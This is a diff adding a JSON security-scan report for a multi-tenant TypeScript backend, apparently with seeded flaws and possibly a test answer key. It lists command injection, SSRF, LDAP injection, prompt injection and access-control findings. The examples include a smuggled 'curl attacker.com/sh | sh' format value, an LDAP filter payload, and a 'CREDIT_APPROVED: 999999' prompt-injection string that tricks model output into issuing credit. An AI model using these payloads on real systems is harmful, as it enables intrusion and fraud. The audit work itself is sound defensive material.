@@ -1,0 +1,1182 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "typescript.security.injection.command-injection",
+      "path": "backend/src/modules/import-export/import-export.service.ts",
+      "start": {
+        "line": 69,
+        "col": 5,
+        "offset": 2740
+      },
+      "end": {
+        "line": 69,
+        "col": 75,
+        "offset": 2810
+      },
+      "extra": {
+        "message": "The user-supplied 'format' field from POST /export/renewals/convert is interpolated directly into a shell command: execSync(`pandoc ${tmpInput} -f csv -t ${format} -o ${tmpOutput}`). There is no allowlist validation (the sibling convertHealthReport validates against CONVERTIBLE_FORMATS and uses spawnSync with shell:false), so a format value such as 'pdf; curl attacker.com/sh | sh' yields arbitrary command execution on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.path-traversal",
+      "path": "backend/src/modules/import-export/import-export.service.ts",
+      "start": {
+        "line": 42,
+        "col": 5,
+        "offset": 1627
+      },
+      "end": {
+        "line": 43,
+        "col": 47,
+        "offset": 1739
+      },
+      "extra": {
+        "message": "saveRenewalSnapshot builds the output path with path.join(this.snapshotDir, `${label}.csv`) where 'label' comes directly from the POST /export/renewals/snapshot body with no sanitization, then writes attacker-controlled CSV content to that path. A label like '../../startup' writes files outside the snapshot directory (e.g. overwriting application files). The sibling saveEscalationsSnapshot correctly applies path.basename(label); this function does not.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.ssrf",
+      "path": "backend/src/modules/documents/documents.service.ts",
+      "start": {
+        "line": 225,
+        "col": 5,
+        "offset": 7312
+      },
+      "end": {
+        "line": 225,
+        "col": 54,
+        "offset": 7361
+      },
+      "extra": {
+        "message": "importDocumentFromExternalSource calls fetch(sourceDocumentUrl) where the URL is taken verbatim from the caller-controlled 'x-document-source-url' header of POST /documents/import-from-source. There is no scheme or host validation, so any authenticated user can make the server issue requests to arbitrary targets (internal services, cloud metadata endpoints such as http://169.254.169.254/, loopback admin panels) and store the response body. The sibling importDocumentFromApprovedRepository validates the hostname against ALLOWED_DOCUMENT_SOURCE_HOSTS; this path performs no such check.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.ldap-injection",
+      "path": "backend/src/modules/directory/directory.service.ts",
+      "start": {
+        "line": 31,
+        "col": 20,
+        "offset": 923
+      },
+      "end": {
+        "line": 31,
+        "col": 41,
+        "offset": 944
+      },
+      "extra": {
+        "message": "findStaffByEmail builds an LDAP/directory search filter by string interpolation: `(mail=${email})` using the 'email' query parameter from GET /directory/staff-by-email. The value is not passed through escapeDirectoryFilterValue() (unlike verifyEmployeeBadge), so input containing '*', '(', ')' or '\\' alters the filter logic, enabling filter manipulation and unauthorized directory reads.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.ldap-injection",
+      "path": "backend/src/modules/directory/directory.service.ts",
+      "start": {
+        "line": 40,
+        "col": 20,
+        "offset": 1266
+      },
+      "end": {
+        "line": 40,
+        "col": 47,
+        "offset": 1293
+      },
+      "extra": {
+        "message": "searchStaffDirectory builds the directory filter `(cn=*${searchTerm}*)` using the raw 'q' query parameter from GET /directory/staff-search without calling escapeDirectoryFilterValue(). An attacker can inject filter metacharacters (e.g. '*)((objectClass=*)' style payloads) to change the scope of the directory query.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.ssti",
+      "path": "backend/src/modules/notifications/notifications.service.ts",
+      "start": {
+        "line": 58,
+        "col": 5,
+        "offset": 1983
+      },
+      "end": {
+        "line": 58,
+        "col": 65,
+        "offset": 2043
+      },
+      "extra": {
+        "message": "previewCustomOrganizationNotice compiles a fully user-controlled template with Handlebars.compile(customMessageTemplate) on the server, where the template comes from the 'messageTemplate' body field of POST /notifications/compose/custom-notice-preview. Compiling untrusted template source is server-side template injection: payloads using Handlebars syntax (e.g. constructor/lookup escapes) can access unintended objects and, on Handlebars versions vulnerable to the known template-escape RCE (CVE-2019-19919 and related), achieve remote code execution. The sibling previewStandardRenewalNotice compiles only a fixed server-side template.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.llm-prompt-injection",
+      "path": "backend/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 225,
+        "col": 5,
+        "offset": 7935
+      },
+      "end": {
+        "line": 235,
+        "col": 63,
+        "offset": 8774
+      },
+      "extra": {
+        "message": "draftFollowupReply embeds the raw user-supplied 'customerFollowUp' string into the prompt, sends it to the language model, then parses the model output for 'CREDIT_APPROVED: <amount>' (line 231) and automatically calls issueGoodwillCredit to apply that amount (lines 232-235) with no human approval and no amount cap (IssueCreditDto only enforces @Min(0)). A customer contact or agent can include 'CREDIT_APPROVED: 999999' in their follow-up text; the echoed/injected marker is matched by the regex and the credit is applied directly to the escalation, making user input control an unauthorized financial state change.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 202,
+        "col": 3,
+        "offset": 6961
+      },
+      "end": {
+        "line": 208,
+        "col": 4,
+        "offset": 7249
+      },
+      "extra": {
+        "message": "issueGoodwillCredit updates goodwillCreditAmount on any escalation by id with no authorization or ownership check at all: the controller (POST /escalations/:id/goodwill-credit) does not even pass the current user, and the service never validates the caller's role or that the escalation belongs to their organization. Any authenticated user, including a customer contact of any other tenant, can set arbitrary credit amounts on any escalation. The contrast with applyRetentionCredit in deals.service.ts, which enforces role and ownership checks, confirms this check is missing.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/organizations/organizations.service.ts",
+      "start": {
+        "line": 108,
+        "col": 3,
+        "offset": 3538
+      },
+      "end": {
+        "line": 116,
+        "col": 4,
+        "offset": 3896
+      },
+      "extra": {
+        "message": "update() for PATCH /organizations/:id performs no authorization check whatsoever: it does not call assertOrganizationAccess and the controller defines no @Roles. Unlike updateHealth, updatePlan (admin-only) and updateStatus's peers, any authenticated user of any role can modify any organization's name, billing contact and notes.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/organizations/organizations.service.ts",
+      "start": {
+        "line": 161,
+        "col": 3,
+        "offset": 5505
+      },
+      "end": {
+        "line": 169,
+        "col": 4,
+        "offset": 5858
+      },
+      "extra": {
+        "message": "updateStatus() for PATCH /organizations/:id/status accepts currentUser but never calls assertOrganizationAccess and has no @Roles restriction on the route. Any authenticated user (even a customer contact of an unrelated tenant) can set any organization's status to suspended or canceled, a tenant-wide denial of service.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.broken-access-control",
+      "path": "backend/src/modules/contacts/contacts.service.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 651
+      },
+      "end": {
+        "line": 32,
+        "col": 6,
+        "offset": 1066
+      },
+      "extra": {
+        "message": "findAll() only restricts CUSTOMER_CONTACT users; for every other role the 'where' clause stays empty unless a caller-supplied organizationId filter is provided, and that filter is never ownership-checked. An ACCOUNT_MANAGER calling GET /contacts (no filter) receives every contact of every organization in the database, and any organizationId value returns that tenant's contacts. findOne() restricts account managers to organizations they own, so the missing restriction here is a cross-tenant broken access control flaw.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-359: Exposure of Private Personal Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.broken-access-control",
+      "path": "backend/src/modules/documents/documents.service.ts",
+      "start": {
+        "line": 25,
+        "col": 3,
+        "offset": 844
+      },
+      "end": {
+        "line": 47,
+        "col": 6,
+        "offset": 1599
+      },
+      "extra": {
+        "message": "findAll() restricts only CUSTOMER_CONTACT users. For ACCOUNT_MANAGER (and any other role) the where clause is empty when no organizationId filter is given, so GET /documents returns every organization's documents (names, metadata, uploader info); additionally the caller-supplied organizationId filter is applied without checking the account manager owns that organization. findOne() enforces owner-based checks for account managers, so this list endpoint is a cross-tenant data exposure.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-359: Exposure of Private Personal Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/api-keys/api-keys.service.ts",
+      "start": {
+        "line": 58,
+        "col": 3,
+        "offset": 1680
+      },
+      "end": {
+        "line": 79,
+        "col": 4,
+        "offset": 2562
+      },
+      "extra": {
+        "message": "create() assigns apiKey.organizationId = createApiKeyDto.organizationId with no validation that the caller (or their organization) has any relationship to that organization \u2014 unlike contacts/deals/escalations create which at least restrict customer contacts to their own org. Any authenticated user can mint a new ACTIVE API key for an arbitrary victim organization and receives the raw key (plainKey) in the response, effectively granting themselves API credentials for another tenant.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.idor",
+      "path": "backend/src/modules/users/users.service.ts",
+      "start": {
+        "line": 28,
+        "col": 3,
+        "offset": 909
+      },
+      "end": {
+        "line": 43,
+        "col": 4,
+        "offset": 1374
+      },
+      "extra": {
+        "message": "findOne() behind GET /users/:id has no @Roles restriction and only enforces an ownership check when the caller is an ACCOUNT_MANAGER. Any other authenticated user (e.g. a customer contact of any tenant) can fetch any other user's full record by id \u2014 an IDOR that leaks user profiles across tenants.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.sensitive-data.exposure",
+      "path": "backend/src/modules/users/users.controller.ts",
+      "start": {
+        "line": 34,
+        "col": 3,
+        "offset": 1004
+      },
+      "end": {
+        "line": 37,
+        "col": 40,
+        "offset": 1172
+      },
+      "extra": {
+        "message": "GET /users/:id (and likewise GET /users and GET /users/profile) return the raw TypeORM User entity. The User entity has no @Exclude decorators and no ClassSerializerInterceptor is registered, so every response includes the passwordHash and passwordResetCode columns alongside profile data, exposing password hashes and active password-reset codes to API consumers.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/import-export/import-export.controller.ts",
+      "start": {
+        "line": 38,
+        "col": 3,
+        "offset": 1129
+      },
+      "end": {
+        "line": 44,
+        "col": 25,
+        "offset": 1418
+      },
+      "extra": {
+        "message": "GET /export/renewals requires only authentication (no @Roles, and exportRenewals() takes no user parameter). It exports every active organization's name, plan, renewal date, health score, billing contact name and billing email as CSV. Any authenticated user of any role can exfiltrate all tenants' billing data. importOrganizations is correctly admin-only, showing these export routes are missing the same restriction.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-359: Exposure of Private Personal Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/import-export/import-export.controller.ts",
+      "start": {
+        "line": 46,
+        "col": 3,
+        "offset": 1401
+      },
+      "end": {
+        "line": 52,
+        "col": 25,
+        "offset": 1691
+      },
+      "extra": {
+        "message": "GET /export/health has no @Roles restriction and exportHealth() ignores the caller entirely, returning a CSV of every organization in the system including internal notes and health data. Any authenticated user can download all tenants' customer-health data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-359: Exposure of Private Personal Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/import-export/import-export.controller.ts",
+      "start": {
+        "line": 54,
+        "col": 3,
+        "offset": 1674
+      },
+      "end": {
+        "line": 60,
+        "col": 25,
+        "offset": 1975
+      },
+      "extra": {
+        "message": "GET /export/escalations has no @Roles restriction and exportEscalations() ignores the caller, exporting every tenant's escalations (subjects, severities, statuses, organization names, assignee names) as CSV. Any authenticated user can exfiltrate the full cross-tenant escalation list.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-359: Exposure of Private Personal Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/import-export/import-export.service.ts",
+      "start": {
+        "line": 104,
+        "col": 3,
+        "offset": 4294
+      },
+      "end": {
+        "line": 143,
+        "col": 4,
+        "offset": 5551
+      },
+      "extra": {
+        "message": "importContacts() for POST /import/contacts accepts an arbitrary organizationId from the request body and bulk-creates contacts in it. Neither the controller nor the service performs any role or organization-ownership check (contrast contacts.service.create which restricts customer contacts to their own organization), so any authenticated user can inject arbitrary contact records into any tenant.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.open-redirect",
+      "path": "backend/src/modules/documents/documents.controller.ts",
+      "start": {
+        "line": 119,
+        "col": 5,
+        "offset": 3641
+      },
+      "end": {
+        "line": 119,
+        "col": 53,
+        "offset": 3689
+      },
+      "extra": {
+        "message": "continueDocumentWorkflow redirects to res.redirect(workflowReturnUrl || '/documents') where workflowReturnUrl is the raw 'x-workflow-return-url' request header, fully controlled by the caller, with no validation of scheme, host or path. This is an open redirect that can send users to attacker-controlled URLs (including javascript: or credential-phishing pages). The sibling escalations continueEscalationWorkflow validates the return URL against ESCALATION_WORKFLOW_RETURN_PATHS before redirecting, confirming the missing validation here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/documents/documents.service.ts",
+      "start": {
+        "line": 75,
+        "col": 3,
+        "offset": 2328
+      },
+      "end": {
+        "line": 103,
+        "col": 4,
+        "offset": 3145
+      },
+      "extra": {
+        "message": "upload() takes the organizationId directly from the request body and stores the file and document record without any check that the caller is allowed to act on that organization. Contacts, deals and escalations all restrict customer contacts to their own organization on create; documents.upload has no such check for any role, letting any authenticated user plant documents (including customer_visible ones) into a victim organization's library.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.hardcoded-credentials.jwt-secret",
+      "path": "backend/src/config/app.config.ts",
+      "start": {
+        "line": 4,
+        "col": 3,
+        "offset": 90
+      },
+      "end": {
+        "line": 4,
+        "col": 77,
+        "offset": 164
+      },
+      "extra": {
+        "message": "The application configuration falls back to a hardcoded JWT signing secret 'dev-secret-key-change-in-production' whenever the JWT_SECRET environment variable is not set. If deployed without the variable, any attacker who knows this public default can forge valid JWTs for arbitrary users (including platform_admin), completely bypassing authentication. The same fallback is duplicated in jwt.strategy.ts line 19 and auth.module.ts line 21.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-321: Use of Hard-coded Cryptographic Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.hardcoded-credentials.jwt-secret",
+      "path": "backend/src/modules/auth/strategies/jwt.strategy.ts",
+      "start": {
+        "line": 19,
+        "col": 7,
+        "offset": 687
+      },
+      "end": {
+        "line": 19,
+        "col": 103,
+        "offset": 783
+      },
+      "extra": {
+        "message": "The JWT verification strategy falls back to the hardcoded secret 'dev-secret-key-change-in-production' when app.jwtSecret is unset. Because this is the value used to verify incoming bearer tokens, tokens signed with the publicly-known default secret are accepted, allowing authentication bypass via forged tokens when the environment variable is missing.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-321: Use of Hard-coded Cryptographic Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misconfiguration.cors",
+      "path": "backend/src/main.ts",
+      "start": {
+        "line": 9,
+        "col": 3,
+        "offset": 297
+      },
+      "end": {
+        "line": 13,
+        "col": 5,
+        "offset": 414
+      },
+      "extra": {
+        "message": "app.enableCors({ origin: true, credentials: true }) reflects any requesting Origin back as the allowed origin while simultaneously allowing credentials. This permissive CORS policy lets any malicious site make authenticated cross-origin requests to the API with the victim's cookies/credentials and read the responses, defeating the same-origin policy for this credentialed API.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-16: Configuration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.weak-random",
+      "path": "backend/src/modules/auth/auth.service.ts",
+      "start": {
+        "line": 74,
+        "col": 7,
+        "offset": 2176
+      },
+      "end": {
+        "line": 74,
+        "col": 63,
+        "offset": 2232
+      },
+      "extra": {
+        "message": "sendPasswordResetEmail generates the password reset code with Math.random().toString(36).substring(2, 15). Math.random() is a non-cryptographic PRNG whose output is predictable; security tokens must use crypto.randomBytes (as createTeamInviteCode and api-key creation correctly do). A predictable reset code allows an attacker to take over arbitrary accounts by computing valid reset codes.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)",
+            "CWE-340: Generation of Predictable Numbers or Identifiers"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.sensitive-data.log-exposure",
+      "path": "backend/src/modules/api-keys/api-keys.service.ts",
+      "start": {
+        "line": 88,
+        "col": 5,
+        "offset": 2962
+      },
+      "end": {
+        "line": 94,
+        "col": 6,
+        "offset": 3146
+      },
+      "extra": {
+        "message": "recordKeyIssuanceForSupportTicket writes a log line containing issuedKey: rawKey \u2014 the plaintext, never-to-be-stored-again API key \u2014 together with the full apiKey entity (including keyHash) and the issuing user object. Anyone with access to application logs can recover live API key secrets. The sibling recordKeyRotationForSupportTicket deliberately logs only non-secret fields ('the new secret material itself never needs to leave the response body'), confirming this is a leak.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.information-disclosure.internal-notes",
+      "path": "backend/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 47,
+        "col": 3,
+        "offset": 1849
+      },
+      "end": {
+        "line": 75,
+        "col": 4,
+        "offset": 2629
+      },
+      "extra": {
+        "message": "findOne() loads escalations with relations { comments: { author: true } } and returns the entity directly, including the internalNotes column and ALL comments \u2014 including those flagged isInternal. Customer contacts of the same organization receive internal support notes via GET /escalations/:id even though getComments() explicitly filters isInternal comments for customer contacts ('Customer contacts can't see internal comments'), leaking internal support discussion to customers.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.sensitive-data.exposure",
+      "path": "backend/src/modules/organizations/organizations.service.ts",
+      "start": {
+        "line": 82,
+        "col": 5,
+        "offset": 2692
+      },
+      "end": {
+        "line": 93,
+        "col": 6,
+        "offset": 3076
+      },
+      "extra": {
+        "message": "findOne() loads the organization with relations contacts (User entities), apiKeys, webhooks, deals, escalations and documents, then spreads the raw entity into the response. The embedded User objects include passwordHash and passwordResetCode (no serialization exclusion anywhere), and the apiKeys relation exposes key hashes for the organization, so a single GET /organizations/:id discloses password hashes and key material fields to anyone allowed to view the org.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.broken-access-control",
+      "path": "backend/src/modules/api-keys/api-keys.service.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 628
+      },
+      "end": {
+        "line": 30,
+        "col": 6,
+        "offset": 985
+      },
+      "extra": {
+        "message": "findAll() only filters results for CUSTOMER_CONTACT users. For every other role (including ACCOUNT_MANAGER) the query has an empty where clause, returning every organization's API keys with organization and createdBy relations. findOne() enforces owner-based checks for account managers, so this unrestricted listing is a cross-tenant exposure of API key metadata and hashes.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.broken-access-control",
+      "path": "backend/src/modules/webhooks/webhooks.service.ts",
+      "start": {
+        "line": 20,
+        "col": 3,
+        "offset": 738
+      },
+      "end": {
+        "line": 31,
+        "col": 6,
+        "offset": 1097
+      },
+      "extra": {
+        "message": "findAll() restricts only CUSTOMER_CONTACT users; for all other roles the where clause is empty and GET /webhooks returns every organization's webhooks (URLs, event subscriptions, hashed secrets, creator details). findOne() enforces ownership checks for account managers, so the missing filter here is a cross-tenant broken access control flaw.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authorization",
+      "path": "backend/src/modules/webhooks/webhooks.service.ts",
+      "start": {
+        "line": 59,
+        "col": 3,
+        "offset": 1799
+      },
+      "end": {
+        "line": 71,
+        "col": 4,
+        "offset": 2272
+      },
+      "extra": {
+        "message": "create() spreads createWebhookDto (including an arbitrary organizationId and a caller-chosen URL) into a new webhook with no check that the caller belongs to or owns that organization. Any authenticated user can register a webhook pointing at their own server for a victim organization, so any future event delivery to that webhook would stream the victim tenant's event data to the attacker.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misconfiguration.cookie-flags",
+      "path": "backend/src/modules/workspace-access/workspace-access.controller.ts",
+      "start": {
+        "line": 29,
+        "col": 5,
+        "offset": 962
+      },
+      "end": {
+        "line": 29,
+        "col": 48,
+        "offset": 1005
+      },
+      "extra": {
+        "message": "res.cookie('workspace_context', sessionId) sets a session-identifier cookie without httpOnly, secure or sameSite attributes (the same pattern repeats at lines 77 and 94 for the terminal-handoff endpoints). Compare the support-console cookie at line 45 which correctly sets httpOnly, secure and sameSite:'strict'. Without these flags the workspace session id is readable by JavaScript (XSS-exfiltratable), transmitted over plain HTTP, and attached to cross-site requests.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.session-fixation",
+      "path": "backend/src/modules/workspace-access/workspace-access.service.ts",
+      "start": {
+        "line": 128,
+        "col": 5,
+        "offset": 5134
+      },
+      "end": {
+        "line": 128,
+        "col": 32,
+        "offset": 5161
+      },
+      "extra": {
+        "message": "authenticateWorkspaceHandoff rebinds an existing shared session by overwriting session.userId = user.id and reusing the same session id (and the terminal's pre-existing workspaceOrganizationId scope). The sibling reauthenticateWorkspaceHandoff explicitly removes the prior session and mints a fresh one 'tied to their own identity instead of inheriting whatever session the terminal already had loaded'. Reassigning ownership of a fixated session id is a session-fixation pattern: a session identifier placed on a terminal before login survives authentication and retains the previous user's org scope.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.cleartext-transmission",
+      "path": "backend/src/modules/organizations/organizations.service.ts",
+      "start": {
+        "line": 155,
+        "col": 7,
+        "offset": 5361
+      },
+      "end": {
+        "line": 155,
+        "col": 101,
+        "offset": 5455
+      },
+      "extra": {
+        "message": "syncBillingProfile sends the billing provider API key as a URL query parameter (api_key=${apiKey}) over cleartext http:// to the billing host. Credentials in URLs are recorded in server access logs, proxies and browser/server histories, and plain HTTP exposes them to network eavesdroppers. The sibling relayDeliveryToPartner correctly uses https with an Authorization: Bearer header, confirming the unsafe pattern here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-319: Cleartext Transmission of Sensitive Information",
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.information-disclosure.error-details",
+      "path": "backend/src/modules/audit-log/audit-log.service.ts",
+      "start": {
+        "line": 78,
+        "col": 9,
+        "offset": 2478
+      },
+      "end": {
+        "line": 78,
+        "col": 85,
+        "offset": 2554
+      },
+      "extra": {
+        "message": "runDiagnosticReport returns { error: err.message, stack: err.stack, query: where } to the HTTP client when the caller-supplied includeQueryContext body flag is set. Full server stack traces disclose internal file paths, library versions and SQL structure. The safe pattern used by runBacklogHealthCheck gates stack disclosure on process.env.NODE_ENV === 'development' \u2014 a server-side condition \u2014 whereas here disclosure is controlled by the request body.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.information-disclosure.error-details",
+      "path": "backend/src/common/filters/http-exception.filter.ts",
+      "start": {
+        "line": 36,
+        "col": 5,
+        "offset": 1123
+      },
+      "end": {
+        "line": 37,
+        "col": 34,
+        "offset": 1197
+      },
+      "extra": {
+        "message": "The global exception handler forwards the raw message of any non-HttpException error (exception.message) to the client in the JSON response while keeping status 500. Unexpected errors such as database failures expose internal details (SQL fragments, constraint names, file paths) to end users instead of a generic message.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.org-self-assignment",
+      "path": "backend/src/modules/auth/auth.service.ts",
+      "start": {
+        "line": 63,
+        "col": 5,
+        "offset": 1866
+      },
+      "end": {
+        "line": 63,
+        "col": 58,
+        "offset": 1919
+      },
+      "extra": {
